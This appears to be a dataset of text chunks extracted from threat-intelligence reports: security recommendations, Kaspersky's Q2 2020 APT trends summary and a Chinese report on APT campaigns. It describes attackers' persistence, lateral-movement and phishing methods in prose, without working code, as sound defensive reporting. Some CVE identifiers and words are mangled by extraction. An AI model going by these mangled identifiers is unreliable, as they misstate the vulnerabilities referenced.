Even the latest generation of automated security systems are managed by a team. It is this team of specialists that determines how much of the product's capabilities you use and therefore the effectiveness of the solution. Learning and innovation must become a continuous process. Processes The number of people in your response team and existence of playbooks is just as important as the coherence and interchangeability of each unit within that team. Consultants always advise you to assign roles in the team, but do you conduct ""rehearsals"" on a regular basis? Do all team members know how they should act in any given situation? Involve your team in creating a playbook and establish effective interaction between teams and employees.

General recommendations

Threat hunting

and proactive defense

Monitoring and proactive threat detection are not new for the cyber industry, but not everyone is managing to implement these processes. You need to constantly collect and match indicators of compromise and TTPs of attackers. Train your team in new techniques, improve their skills, and provide them with the latest tools.

Hygiene

and hygiene

Phishing and social engineering have remained the most popular vectors of initial compromise. Ordinary employees hold their defenses behind their monitors and inboxes every day. Establishing a password policy and conducting training and social engineering testing will help protect against phishing and prevent corporate data leaks.

Trust MSS providers

and partners

Product innovations aren’t slowing down their momentum, and technical skills are always needed to ensure information security. Therefore, more companies are delegating part or most of their information security tasks to MSS providers. Doing so not gets best-in-class technical specialists at your side without hiring but also is beneficial for budget allocation.

Keep in touch with

your competitors

To raise awareness of new threats, you need to go beyond professional trainings and start a dialogue with colleagues from your industry. Competitors could become your partners in the fight against common enemies: APTs, pro-state groups, ransomware attacks, and others.

Checkups and cyber"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|334aa368d54b48e8a89aa450d154e92a
"Checkups and cyber

risk insurance

Just as people need regular checkups, so do companies need to regularly assess their security infrastructures. Nowadays, this applies not only to infrastructure but also to teams and processes. The standard set of checkups should be supplemented with a third-party audit as well as an assessment of potential retrospective compromise. It is important to note that the above does not negate the importance of cyber risk insurance, especially when you are responsible for the information of your customers and employees.

Measuring

performance

Information security is becoming more expensive for companies, which is why many are requesting that the effectiveness of solutions be measured and compared. The saturated market dictates the new rules: solutions should not just be modern and efficient but also advantageous for businesses. Comparing costs to the effectiveness of a tool in its pilot stage also requires defining business metrics that differ in one way or another from the size of the company and its infrastructure. Analysts from Gartner, Forrester, and other analytical agencies handle the market's requests to collect performance measurements and their metrics.

Recommendations for how to set up your technical infrastructure and train your information security team — Hunt for traces of covert activity by threat actors in the company network. This helps stop an ongoing attack for which the initial stages were overlooked by the organization's security controls. — Implement a Malware Detonation Platform that allows for suspicious files and links to be run in an isolated environment, be analyzed in detail, and subsequently blocked if found to be malicious. — Use a Threat intelligence solution to identify threats, leaks, breaches, and other hacker activity before they can harm you. — Back up regularly. Any backups must be separated from the main network so that they cannot be accessed by threat actors if administrator accounts become compromised. — Conduct round-the-clock monitoring of information security events and be prepared to promptly respond."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|f1f4186b14d74c8dbc8a8eae0e13c098
"Unfortunately, it is not always possible to detect attacks at early stages: threat actors continuously improve their skills and implement new techniques to gain access to networks of various size. Detecting traces of compromise at different stages of the cyber kill chain requires an ia ntegrated approach. This approach involves creating a centralized data source about what is happening in the network infrastructure and isolating compromised hosts. XDR solutions can be used for these purposes, as they are able to detect malicious activity

— Each incident should be matched with its level of complexity. Incidents that require analysis should be investigated, the causes and consequences should be identified, and the problems that caused the incident should be fixed. For the second level of response, it is important to have a third-party incident response team with pre-negotiated agreement that can assist in stopping a complex targeted attack. — Make sure that your team has the necessary skills to perform threat hunting and collect threat intelligence. — Conduct regular digital hygiene training for employees."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|55d2463523494225a74b6e82658a296f
"— Conduct periodic fraud risk assessments to see if your solutions and procedures can defend against existing attacks and fraudulent schemes that use different attack channels. Identify the main risk factors, and start from existing and possible problems when choosing a fraud protection solution. — Create a layered protection for your web portal using not only transaction analysis, but also solutions for session analysis of behavior and devices, and unveil fraudulent operations that occur on your web channel. Leave only legitimate users on your portal and take actions regarding blocking suspicious users or bots.

— Perform security assessments in a format that simulates real-life actions taken by cybercriminals. This approach will help identify weaknesses in the company's IT infrastructure and determine whether the company is ready to combat real cyberattacks.

at various layers, regardless of the tactics, techniques, and procedures used by threat actors. Reducing cyber attacker dwell time also requires not only high-quality response but also proactive analysis, which can be carried out both by the organization's employees with relevant competencies and by outsourced experts. The latter speeds up the investigation and improves the quality of analysis significantly."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|709aef3168f04266ac1a5f60d68a1c0c
"Both reactive and proactive approaches require not only relevant competencies but also a significant amount of cyber threat intelligence data.

Ransomware

— Be prepared to identify signs of initial compromise, methods used to achieve persistence in the system, and lateral movement. Although attack techniques are usually primitive and can be detected with the naked eye, more advanced attacks can be identified only by hunting for threats. — Regularly check your infrastructure for known bad indicators of compromise. — The success of ransomware affiliate programs depends on an organization's overall level of security. We recommend using security systems such as Group-IB Threat Hunting Framework and Group-IB Threat Intelligence & Attribution.

Post-exploitation frameworks: a free tool called Metasploit and a cracked version of Cobalt Strike. Less often, the frameworks PoshC2 and Koadic.

— Ensure that your security tools are able to detect tracks of popular post-exploitation frameworks. — Ensure that a sufficient number of different and unique data sources are used when assessing the security level of your infrastructure and preparing for attacks.

chain attacks"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|9939a5b575fd4e27a52242afbca68041
"Supply

chain attacks

— Ensure that your current security tools are able to detect anomalous activity when legitimate software is being used. Such activity may include launches of atypical processes, creation of files, and file system or registry modifications that are usually used to achieve persistence in the system. — Common security tools are usually unable to handle such tasks, therefore we recommend considering Group-IB Threat Hunting Framework.

Privilege escalation using

various software (e.g.,

Mimikatz, LaZagne) or

brute

force attacks

To counteract Mimikatz, we recommend:

Tools for attacks on physically isolated networks that use USB devices for jumping the air gap

Do not use untrusted USB devices or USB devices of unknown/ questionable origin.

APT trends report Q2 2020 securelist.com/apt-trends-report-q2-2020/97937 By GReAT

For more than three years, the Global Research and Analysis Team (GReAT) at Kaspersky has been publishing quarterly summaries of advanced persistent threat (APT) activity. The summaries are based on our threat intelligence research and provide a representative snapshot of what we have published and discussed in greater detail in our private APT reports. They are designed to highlight the significant events and findings that we feel people should be aware of. This is our latest installment, focusing on activities that we observed during Q2 2020. Readers who would like to learn more about our intelligence reports or request more information on a specific report are encouraged to contact ‘intelreports@kaspersky.com‘."|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|3d27b0d0939648f8ad7299538b9c9bfb
The most remarkable findings On May 11, the UK-based supercomputing center, ARCHER, announced that it would shut down access to its network while it investigated a security incident. The website stated that the “ARCHER facility is based around a Cray XC30 supercomputer (with 4920 nodes) that provides the central computational resource”. At the same time, the Germanbased bwHPC also announced a security incident and decided to restrict access to its resources. The Swiss National Supercomputing Centre, at the time involved in a project to study the small membrane protein of the coronavirus, confirmed that it, and other European high-performance computer facilities, had been attacked and that it had temporarily closed. On May 15, the EGI Computer Security and Incident Response Team (EGI-CSIRT) published an alert covering two incidents that, according to its report, may or may not be related. Both incidents describe the targeting of academic data centers for “CPU mining purposes”. The alert includes a number of IoCs, which complement other OSINT (open-source intelligence) observations. Although we weren’t able to establish with a high degree of certitude that the ARCHER hack and the incidents described by EGI-CSIRT are related, we suspect they might be. Some media speculated that all these attacks might be related to COVID-19 research being carried out at the supercomputing centers.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|690f716b9c744d3caabab31cff6695f9
"Interestingly, last July 16th 2020, NCSC published an advisory describing malicious activity targeting institutions related to research to find a vaccine for COVID-19. In this case, the malware used in the attacks belongs to a family called WellMess, as originally described by LAC Co back in 2018. Until recently, this malware was not believed to be related to any APT activity. Surprisingly, NCSC attributes this activity to the APT-29 threat actor. However, it does not provide any public proof.

From our own research, we can confirm that WellMess’s activity seems to follow a cycle, being used in campaigns every three months or so since its discovery. We observed a peak of activity in fall of 2019, followed by an increase in the number of C2s in February 2020. We also observed high-profile targeting, including telcos, government and contractors in MENA and the EU. However, from our side we cannot confirm attribution or targeting of health institutions at the moment. For more details about WellMess, you can check our presentation from GReAT ideas here: https://youtu.be/xeTYLRCwnFo"|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|ad7c7665a1d1460abb7c161b8d7d82d6
Russian-speaking activity In May, researchers at Leonardo published a report about “Penquin_x64”, a previously undocumented variant of Turla’s Penquin GNU/Linux backdoor. Kaspersky has publicly documented the Penquin family, tracing it back to its Unix ancestors in the Moonlight Maze operation of the 1990s. We followed up on this latest research by generating network probes that detect Penquin_x64 infected hosts at scale, allowing us to discover that tens of internet hoster’s servers in Europe and the US are still compromised today. We think it’s possible that, following public disclosure of Turla’s GNU/Linux tools, the Turla threat actor may have been repurposing Penquin to conduct operations other than traditional intelligence. In June, we discovered two different domain names, “emro-who[. ]in” and “emrowho[. ]org”, typo-squatting the World Health Organization (WHO) Regional Office for the Eastern Mediterranean (EMRO). These domains, registered on June 21 using the Njalla.no registrar, seem to be used as sender domains for a spear-phishing campaign. This type of typo-squatting is reminiscent of Sofacy campaigns against other international organizations. Moreover, we have seen Njalla.no recently used to register SPLM and XTUNNEL C2 (command-and-control) servers and we have seen this autonomous system used by Sofacy in the past for a SPLM C2.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|4fa90498ae634454a0df8cac43dfb249
"Hades is an elusive, highly dynamic threat actor that commonly engages in tailored hacking and special access operations, such as the OlympicDestroyer attack or the ExPetr (aka NotPetya) and Badrabbit attacks. On May 28, the US National Security Agency (NSA) published an alert detailing the use by Hades of an Exim vulnerability (CVE-201910149) for what appears to be a potentially large hacking operation designed for mass access. Our own report expanded on the scripts used in this operation, as well as providing other IoCs that we discovered.

Chinese-speaking activity In late 2019, and again in March this year, we described ongoing malicious activities from a previously unknown threat actor that we named Holy Water. Holy Water notably leveraged a Go language and Google Drive-command-driven implant that we dubbed Godlike12. Following the publication of our report, and notifications to relevant incident response organizations, new Holy Water samples were submitted to VirusTotal.

newly discovered samples include Telegram-controlled and open-source-based Python implants that were probably deployed on the victim’s networks after a successful intrusion. In March, one of our YARA rules from previous research on ShadowPad attacks detected a recently compiled executable file uploaded to VirusTotal. Later we found a few other samples from our own telemetry. ShadowPad is a modular attack platform consisting of a root module and various plugin modules responsible for diverse functionalities. ShadowPad was first discovered by Kaspersky in 2017. In August of that year, one of our customers detected suspicious network activities. After thorough investigation, we found a legitimate software module that had been compromised and backdoored by an advanced threat actor in a sophisticated software supply-chain attack. We notified the software vendor and also published the outcome of our investigations in a technical white paper. Since then, ShadowPad malware has been deployed in a number of major cyberattacks, with a different subset of plugins used in different attack cases: the CCleaner incident in 2017 and the ShadowHammer attacks in 2018 are the major examples of such attacks. When analyzing new samples from ShadowPad malware, compiled and used in attacks since late 2019, our investigation revealed a strong connection between these recent ShadowPad malware samples and the CactusPete threat actor."|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|1c6f5611951e479b9c527fcc777963ec
CactusPete started deploying ShadowPad malware to a few victims at the beginning of 2019 through its HighProof backdoor. However, since late 2019, ShadowPad has been commonly used in CactusPete attacks. This quarter, we described another CactusPete attack campaign which started in December 2019 In this campaign, the CactusPete threat actor used a new method to drop an updated version of the DoubleT backdoor onto the computers. The attackers implanted a new dropper module in the Microsoft Word Startup directory, most likely through a malicious document. This malicious dropper is responsible for dropping and executing a new version of the DoubleT backdoor, which utilizes a new method of encrypting the C2 server address. While analysing compromised machines in Central Asia, we revealed an additional infection that was unrelated to the initial subject of our investigation. This led us to detect previously unknown malware that we dubbed B&W, which provides an attacker with the capabilities to remotely control a victim’s machine. Further analysis of the samples, infrastructure and other related artefacts allowed us to conclude, with medium confidence, that the newly found malware is related to the SixLittleMonkeys APT. This group is known to have been active for several years, targeting government entities in Central Asia. HoneyMyte is an APT threat actor that we have been tracking for several years.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|e47afc57cd534219a66455fc6aadabc0
"In February, our fellow researchers at Avira blogged about HoneyMyte PlugX variants that they had recently observed targeting Hong Kong. PlugX has been used by multiple APT groups over the past decade, especially shared among Chinese-speaking threat actors, and https://securelist.com/apt-trends-report-q2-2020/97937/

has changed in many ways. Avira´s post covers the PlugX loader and backdoor payload, including its USB capabilities. In May, we published an update on this threat actor, specifically providing timely indicators to aid in threat hunting for some of the PlugX variants found in the wild between January and May this year. In May, we discovered a watering hole on the website of a Southeast Asian top official. This watering hole, set up in March, seemed to leverage whitelisting and social engineering techniques to infect its targets. The final payload was a simple ZIP archive containing a readme file prompting the victim to execute a CobaltStrike implant. The mechanism used to execute CobaltStrike was DLL side-loading, which decrypted and executed a CobaltStrike stager shellcode. Analysis of the code, the infrastructure and the victimology led us to attribute this watering-hole, with high confidence, to the HoneyMyte APT threat actor. Quarian is a little-known malicious program that Chinese-speaking actors have used since around 2012. We hadn’t spotted any further activity until we observed a resurgence in an attack by the Icefog group in 2019. We tracked the activity of the malware following this and noticed a new variant that was used during several attacks on Middle Eastern and African governments during 2020. In one case, we could see that this variant was deployed following exploitation of the CVE-2020-0688 vulnerability on the network of a government entity.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|0ab9604ab01e477fadf68de8dfbdf812
This vulnerability, which was publicly reported in February 2020, allows an authenticated user to run commands as SYSTEM on a Microsoft Exchange server. In this case, the server was indeed compromised and was hosting the ChinaChopper webshell, which was used to obtain, and later launch, the Quarian and PlugX backdoors. Our analysis led us to assume, with medium to high confidence, that the group behind these attacks is one we track under the name CloudComputating – a Chinese-speaking actor that, based on previous reports, has targeted high-profile Middle Eastern diplomatic targets. In March, researchers at Check Point Research published a report describing an APT campaign that targeted Mongolia’s public sector and leveraged a coronavirus-themed lure to conduct its initial intrusion. We were able to discover further samples and another COVID-themed document with the same targeting, as well as additional targets in Russia. We attribute this activity with medium confidence to IronHusky.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|003a93a96a4c43da8c95ea33b1eb5f90
"Middle East The MuddyWater APT was discovered in 2017 and has been active in the Middle East ever since. In 2019, we reported activity against telecoms providers in Iraq and Iran, as well as government bodies in Lebanon. We recently discovered MuddyWater using a new C++ toolchain in a new wave of attacks in which the actor leveraged an open-source utility called Secure Socket Funneling for lateral movement. At the end of May, we observed that Oilrig had included the DNSExfitrator tool in its toolset. It allows the threat actor to use the DNS over HTTPS (DoH) protocol. Use of the DNS protocol for malware communications is a technique that Oilrig has been using for a https://securelist.com/apt-trends-report-q2-2020/97937/

long time. The difference between DNS- and DoH-based requests is that, instead of plain text requests to port 53, they would use port 443 in encrypted packets. Oilrig added the publicly available DNSExfiltrator tool to its arsenal, which allows DoH queries to Google and Cloudflare services. This time, the operators decided to use subdomains of a COVIDrelated domain which are hardcoded in the DNSExfitrator detected samples."|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|4d03f82f1c47470c8a9f33f125baee8a
Southеast Asia and Korean Peninsula BlueNoroff is one of the most prolific financially motivated APT actors and we have published several reports of BlueNoroff campaigns targeting financial institutions. Recently, we uncovered another campaign that has been active since at least 2017. In this campaign, the group sends spear-phishing emails containing an archived Windows shortcut file. The file names are disguised as security or cryptocurrency related files in order to entice users into executing them. The infection chain started from this shortcut file is a complex multi-stage infection procedure. Before delivering the Windows executable payload, the actor uses two VBS and three PowerShell scripts in order to collect system information. The actor very carefully delivers the final payload only to the intended targets. The backdoor payload also utilizes a multi-stage infection procedure. The actor uses it to control infected hosts and implants additional malware for surveillance. These malicious programs are responsible for stealing the user’s keystrokes and saving a screenshot of the infected machine. The main targets of this campaign are financial institutions, such as cryptocurrency businesses, and fintech companies. We identified diverse victims from 10 countries, as well as more potential victims from open source intelligence. The Lazarus group has been a major threat actor for several years.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|7a63b155b5ec4bf28c01ff01923dc6ec
Alongside goals like cyber-espionage and cyber-sabotage, this threat actor has targeted banks and other financial companies around the globe. The group continues to be very active. We recently observed the Lazarus group attacking a software vendor in South Korea using Bookcode, malware that we evaluate to be a Manuscrypt variant, utilizing a watering-hole attack to deliver it. Manuscrypt is one of the Lazarus group’s tools that is actively being updated and used. The group attacked the same victim twice. Almost a year prior to compromising this victim, Lazarus attempted to infect it by masquerading as a well-known security tool, but failed. We were able to construct the group’s post-exploitation activity, identifying various freeware and red-teaming tools used. Although Lazarus has recently tended to focus more on targeting the financial industry, we believe that in this campaign they were seeking to exfiltrate intellectual property. We also observed that they previously spread Bookcode using a decoy document related to a company working in the defense sector. Based on our observations, we evaluate that the Bookcode malware is being used exclusively for cyber-espionage campaigns. In April, we released an early warning about the VHD ransomware, which was first spotted in late March. This ransomware stood out because of its self-replication method.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|598928593a644590b5bdd0142f3c9178
"The use of a spreading utility compiled with victim-specific credentials was reminiscent of APT campaigns, but at the time we were unable to link the attack to an existing group.

However, Kaspersky was able to identify an incident in which the VHD ransomware was deployed, in close conjunction with known Lazarus tools, against businesses in France and Asia. This indicates that Lazarus is behind the VHD ransomware campaigns that have been documented so far. As far as we know, this is also the first time it has been established that the Lazarus group has resorted to targeted ransomware attacks for financial gain. Last year we created a private report on a malware framework that we named MATA, which we attribute, with low confidence, to the Lazarus group. This framework included several components, such as a loader, orchestrator and plug-ins. Initially, this framework targeted Windows and Linux. However, in April we discovered a suspicious macOS file uploaded to VirusTotal using a rule to detect the MATA malware framework. After looking into this malware, we confirmed that it was a macOS variant of the MATA malware. The malware developers Trojanized an open-source two-factor authentication application and utilized another open-source application template. While investigating, to find more solid evidence for attribution, we found an old Manuscrypt strain that used a similar configuration structure. We also discovered a cluster of C2 servers probably related to this campaign. The MATA framework was not the only way that Lazarus targeted macOS. We also observed a cluster of activity linked to Operation AppleJeus."|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|ec744ab196114f258b12d733a2353b8f
The other was similar to the macOS malware used in a campaign that we call TangDaiwbo. This is a multi-platform cryptocurrency exchange campaign: Lazarus utilizes macro-embedded Office documents and spreads PowerShell or macOS malware, depending on the victim’s system. Early this year, we reported improvements in a Lazarus campaign targeting a cryptocurrency business. In this campaign, Lazarus adopted a downloader that sends compromised host information and selectively fetches the next-stage payload. Recently, we identified a Lazarus campaign with similar strategies, but targeting academic and automotive sectors. Lazarus also adopted new methods to deliver its tools. First of all, the group elaborated its weaponized document by adopting remote template injection techniques. Previously, Lazarus delivered macro-embedded documents to the victim, but the group has now applied one more stage to hinder detection. The group also utilized an open-source PDF reader named Sumatra PDF to make Trojanized applications. They created a Trojanized PDF reader, sending it to the victim with a crafted PDF file. If the victim opens this file, the Trojanised PDF viewer implants malicious files and shows decoy documents to deceive the victim. The actor delivers the final payload very carefully, and executes it in memory. Fortunately, we were able to get the final payload and confirm that it was a Manuscrypt variant that we had already described.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|41af3dabefb34978844d6227474e8cf5
"We also found that it’s the same malware variant that the US CISA (Cybersecurity and Infrastructure Security Agency) recently reported, named COPPERHEDGE. Following our report describing the long-standing PhantomLance campaign in Southeast Asia, we published a private report providing detailed attribution based on discovered overlaps with reported campaigns of the OceanLotus APT. In particular, we found multiple code similarities with the previous Android campaign, as well as similarities in https://securelist.com/apt-trends-report-q2-2020/97937/

macOS backdoors, infrastructure overlap with Windows backdoors and a couple of crossplatform resemblances. Based on our research, we believe, with medium confidence, that PhantomLance is a modern Android campaign conducted by OceanLotus. Apart from the attribution details, we described the actor’s spreading strategy using techniques to bypass app market filters. We also provided additional details about samples associated with previously reported suspected infrastructure, as well as the latest sample deployed in 2020 that uses Firebase to decrypt its payload. Additionally, OceanLotus has been using new variants of its multi-stage loader since the second half of 2019. The new variants use target-specific information (username, hostname, etc.) of the targeted host that they obtained beforehand, in order to ensure their final implant is deployed on the right victim. The group continues to deploy its backdoor implant, as well as Cobalt Strike Beacon, configuring them with updated infrastructure."|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|77a3f5d9dcc749bf893dabdc30433ebc
Other interesting discoveries The Deceptikons APT is a long-running espionage group believed to have been providing mercenary services for almost a decade now. The group is not technically sophisticated and has not, to our knowledge, deployed zero-day exploits. The Deceptikons infrastructure and malware set is clever, rather than technically advanced. It is also highly persistent and in many ways reminds us of WildNeutron. Deceptikon’s repeated targeting of commercial and non-governmental organizations is somewhat unusual for APT actors. In 2019, Deceptikons spear-phished a set of European law firms, deploying PowerShell scripts. As in previous campaigns, the actor used modified LNK files requiring user interaction to initially compromise systems and execute a PowerShell backdoor. In all likelihood, the group’s motivations included obtaining specific financial information, details of negotiations, and perhaps even evidence of the law firms’ clientele. MagicScroll (aka AcidBox) is the name we’ve given to a sophisticated malware framework, whose main purpose is to decrypt and load an arbitrary payload in kernel mode. The framework consists of several stages. The first stage is a Windows security provider that is loaded by the system on boot and executed in user mode. This decrypts and runs a second payload, which is physically stored in the registry.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|8fd735e73ea8496e9490d7e4ed605b34
"Although we weren’t able to find a victim with this second stage, we were able to find a file that matches the expected format of the second stage. This second stage payload utilizes a well-known vulnerability in a VirtualBox driver (CVE-2008-3431) to load the third stage, which is designed to run in kernel mode. The kernel mode payload is decrypted from a resource from the second stage, using the key retrieved from the registry. Unfortunately, we couldn’t find a decryption key to decrypt the third stage payload, so we don’t know what the last part of this malware framework looks like. Although the code is quite sophisticated, we couldn’t identify any similarity with other known frameworks. Aarogya Setu is the name of a mandatory COVID-19 mobile tracking app developed by the National Informatics Centre, an organization that comes under the Ministry of Electronics and Information Technology in India. It allows its users to connect to https://securelist.com/apt-trends-report-q2-2020/97937/

essential health services in India. With cyber criminals and APT actors taking advantage of pandemic-tracking applications to distribute Trojanized mobile apps, we investigated and identified apps that mimic the appearance and behavior of the legitimate Aarogya Setu app while deploying Android RATs. We consider one of these to be a new version of a RAT that we previously reported being used by the Transparent Tribe threat actor."|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|3b3baf8876eb406e97ae65d76349fa5b
Final thoughts The threat landscape isn’t always full of “groundbreaking” events. However, a review of the activities of APT threat actors indicates that there are always interesting developments. Our regular quarterly reviews are intended to highlight these key developments. Here are the main trends that we’ve seen in Q2 2020. Geo-politics remains an important motive for some APT threat actors, as shown in the activities of MuddyWater, the compromise of the Middle East Eye website and the campaigns of CloudComputating and HoneyMyte groups. As is clear from the activities of Lazarus and BlueNoroff, financial gain is another driver for some threat actors – including the use of ransomware attacks. While Southeast Asia continues to be an active region for APT activities, this quarter we have also observed heavy activity by Chinese-speaking groups, including ShadowPad, HoneyMyte, CactusPete, CloudComputating and SixLittleMonkeys. APT threat actors continue to exploit software vulnerabilities – examples this quarter include Hades and MagicScroll. We have noted before that the use of mobile implants is no longer a novelty, and this quarter is no exception, as illustrated by the PhantomLance campaign. It is clear that APT actors, like opportunistic cybercriminals, continue to exploit the COVID-19 pandemic as a theme to lure potential victims. However, we would note once again that this doesn’t represent a shift in TTPs.|data_input/Oilrig_reports/entry_509c2a3e-87b9-4660-bdba-c9eb50f4d59d.text|94c6411b060447499ed1f9f4e174916d
"As always, we would note that our reports are the product of our visibility into the threat landscape. However, it should be borne in mind that, while we strive to continually improve, there is always the possibility that other sophisticated attacks may fly under our radar.

06（Darkhotel）

Darkhotel 组织攻击活动最早可追溯到2010 年，擅长利用浏览器漏洞，尤其是 0day 漏洞针对重点目标 进行精准攻击。去年针对我国的攻击活动中就利用了浏览器、VPN 的多个 0day 漏洞，今年也不例外，4月

初我们监控发现了该组织发起了一次新的攻击活动。

这次 是 针对某网站 挂马进 行水 坑 攻击，该组 织 又一次利用了一 个 全 新的 IE 浏览器 0day 漏 洞（ CVE-

2021

34448 6）。为了避免安全检测和其他非目标范围人群触发漏洞导致攻击暴露，整个水坑攻击过程

中恶意脚本有多重验证由此筛选出真正的攻击目标并最终执行触发 0day 漏洞。最终释放的样本路径、

样本中的混淆代码与thinmon 攻击活动存在复用，且最终载荷与thinmon 的最终载荷一样都使用了

00（海莲花）

2021年上半年，海莲花组织针对我国的攻击活跃程度较去年有所提升，攻击活跃程度仅次于毒云藤、蔓

灵花，3月和4月攻击处于高峰。今年针对 ICT供应商的攻击占比位居首位，已超过直接针对政府、教育等重

点单位的攻击。这些目标供应商主要服务于国防、政府、教育、交通等多个领域。另外，海莲花较其他主流

APT组织还有一个显著的区别，就是在初始攻击突破进入目标内网环境后，会进行大规模复杂的横向移动

攻击。今年上半年继续沿用了去年主流的三种横向移动攻击手法：远程建立服务、远程调用WMI 服务、控

制内网安全软件服务端下发指令。

越来越多的被攻陷网络设备作为C2服务器，在去年的攻击活动中物联网设备已成为APT新的战备资源，

海莲花组织也在积极尝试由此获得更多武器资源，去年7月，我们捕获到海莲花组织陆续攻击路由器设备，

主要针对 DrayTek 厂商路由器设备，进一步将其作为流量中转跳板，相关攻击活动持续至今。

另外今年 4月各单位展开实网攻防演练期间，海莲花攻陷了多个企业 OA 系统服务器，同样这些服务器仅

作为C2 跳板中转用。

主流攻击：白利用+HiJack家族，海莲花的 HiJack 家族是目前最活跃的样本类型，该家族样本使用前期

渗透侦查，获取到的被攻击机器的信息（IP、MAC 地址等），以此当做高强度加密方法（ AES / RC4）唯 一的 KEY，来解码恶意载荷，如果环境相关参数不匹配，则不执行恶意操作，增加安全软件检出难度和分 析人员的分析难度。

白利用持久化新组合，根据 360安全大脑观测到的数据，我们发现海莲花组织攻入企业内部后，滥用白利

用技术，进行持久化驻留。海莲花组织实施横移技术以后，为了持久化驻留，使用了一个新的白利用驻留

模式。

劫持已有软件服务项：搜集目标系统中可被劫持的目标服务项信息，将可被白利用的目标文件，替换目标

服务项所属的主要工作组件。替换完毕后，可等待应用程序服务被动启动，也可通过 SMB/RPC 或内网安

全软件服务端下发命令来远程启动此服务，从而实现后门模块持久化驻留系统。

此方式没有对服务项进行敏感操作，例如增加新服务项或修改原服务项，只对服务目标文件进行替换。可

以理解为模拟常规软件的升级过程，替换被劫持服务的目标文件，替换后的目标文件依然为白名单文件。

目的是为了躲避安全软件的筛查。

多种横向移动方式

潜行者组织近 10 年来的后门的植入方式不尽相同，但多次攻击行动手法都有鲜明的技术特点，主要利用

目标内网的杀毒软件漏洞进行攻击。攻击者在控制了目标内网的任意机器后 ,会利用杀软的漏洞攻击杀软

的客户端和服务端 ,使该目标机器连接伪装的升级中心下载后门升级包并启动以植入后门，进一步后门会

连接公网、内网的 C&C，同时在受害者机器上添加管理员账号，开启文件共享，添加防火墙规则等弱化主

机的防御，以便于攻击者稳固据点，在目标内网中再持续进行横向移动。

潜行者组织攻击的核心目标是长期控制并窃取敏感文件，一旦目标单位环境发生变化，如操作系统、防御

体系更新升级等，都会及时采取应对措施。我们发现该组织在针对某单位横向移动过程中，该单位某杀毒

软件多个版本（包括最新版本）都已被利用。

2.APT攻击紧跟时事热点

APT组织紧密围绕政治、经济等热点领域及事件的攻击活动，并不仅仅是利用作为诱饵钓鱼攻击用，更多

是瞄准了涉及相关时事热点的重点机构或个人。

时事热点的范畴除政治、经济领域外，如疫情态势、某行业专项活动等都会被 APT攻击所关注，尤其在今

年上半年的攻击活动中，针对时事热点的跟进频次和细分粒度已明显超过去年同期。

3.仿冒目标单位邮箱系统集中钓鱼攻击频发

今年上半年的攻击活动中，初始攻击环节主要还是以钓鱼邮件攻击为主，进一步其中大部分是仿冒目标单

位邮箱系统的钓鱼网站攻击。毒云藤今年的攻击活动基本都是这类钓鱼攻击，蔓灵花大部分也是基于此

类。该阶段基本是无样本实体文件的钓鱼攻击，通过社会工程学直接窃取目标用户邮箱账号和密码，待进

一步评估分析后会针对高价值目标继续投递木马恶意文件。

年初我们协助某客户取证分析时发现，访问钓鱼网站的用户中有近 3 成都填写了账号密码，如此高成功率

和邮箱本身就包含了大量敏感文件信息，这样“高性价比”是 APT组织得以青睐的主要原因，但这种攻击方

式的弊端很明显，就是攻击活动非常容易暴露。

基于近一年我们捕获到的钓鱼网站攻击进行统计分析，主要的攻击环节如上图四部分：首先构造钓鱼邮

件，进一步访问时会涉及跳转页面，具体仿冒邮箱系统的虚假登录页面会涉及多种，最后用户填写完账号

密码后则展示相关诱饵文件。"|data_input/Oilrig_reports/entry_dad87900-4f16-484a-88d6-dbc3e953a5b6.text|ba609eeca030403eb9c332982fe43092

基本大部分APT组织的钓鱼网站攻击都会涉及上述关键环节，具体类型会有较大差异，如今年的攻击活动 中，钓鱼邮件中嵌套的钓鱼 URL 地址，蔓灵花会将其转换为 bit.ly 短网址，而毒云藤则保留原始 URL链接

形态；另如在用户被诱导填写账密过程，大部分情况用户名可以任意填写，但毒云藤在针对部分目标时，参

数中自动填写登录用户名，而无法手动修改。

钓鱼攻击中邮件正文诱饵内容会千变万化，钓鱼网站也会不断更新迭代，但如果我们在查收邮件的过程中

加以注意和防范，则可以鉴别出大部分钓鱼攻击和虚假网站。

2. 城市数字化转型下APT威胁加剧

2021年 3月11日，十三届全国人大四次会议表决通过了关于国民经济和社会发展第十四个五年规划和

2035 年远景目标纲要的决议。在国家十四五规划纲要中 44，将“加快数字化发展，建设数字中国”单独成

篇，从国家战略层面明确了数字化转型的重要性。2021年全国两会期间，全国政协委员，360 集团创始

人、董事长周鸿祎就智慧城市面临新型网络威胁，提出加快构建智慧城市安全基座的议案 45 。

从上半年 APT攻击活动整体来看，行业领域是 APT攻击首要关注因素，但由于地缘政治或其他因素导致的

